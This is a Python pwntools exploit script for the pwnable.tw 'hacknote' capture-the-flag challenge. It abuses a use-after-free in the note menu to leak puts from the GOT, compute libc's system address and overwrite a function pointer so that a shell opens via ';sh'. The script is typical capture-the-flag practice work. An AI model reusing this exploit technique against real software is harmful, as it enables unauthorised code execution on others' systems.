#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./hacknote')
#libc = ELF('./libc_32.so.6')
libc = ELF('/usr/lib32/libc.so.6')

# Byte sequence alias
A4 = 4 * b'A'

class Notebook:
    def __init__(self, proc):
        self.proc = proc

    def add(self, size: int, content: bytes):
        self.proc.recvuntil('Your choice :')
        self.proc.send(b'1')
        self.proc.recvuntil('Note size :')
        self.proc.send(str(size).encode('utf-8'))
        self.proc.recvuntil('Content :')
        self.proc.send(content)

    def delete(self, index: int):
        self.proc.recvuntil('Your choice :')
        self.proc.send(b'2')
        self.proc.recvuntil('Index :')
        self.proc.send(str(index).encode('utf-8'))

    def print(self, index: int):
        self.proc.recvuntil('Your choice :')
        self.proc.send(b'3')
        self.proc.recvuntil('Index :')
        self.proc.send(str(index).encode('utf-8'))


def main():
    #proc = remote('chall.pwnable.tw', 10102)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    notes = Notebook(proc)
    notes.add(0x20, b'AAAA')
    notes.add(0x20, b'BBBB')
    notes.delete(0)
    notes.delete(1)
    notes.add(0x08, p32(0x0804862B) + p32(elf.got['puts']))
    notes.print(0)

    libc_puts = u32(proc.recv(4))
    libc_base = libc_puts - libc.sym['puts']
    libc_system = libc_base + libc.sym['system']
    log.info('libc_puts: {}'.format(hex(libc_puts)))
    log.info('libc_base: {}'.format(hex(libc_base)))
    log.info('libc_system: {}'.format(hex(libc_system)))

    notes.delete(2)
    notes.add(0x08, p32(libc_system) + b';sh')
    notes.print(0)

    proc.interactive()


if __name__ == '__main__':
    main()
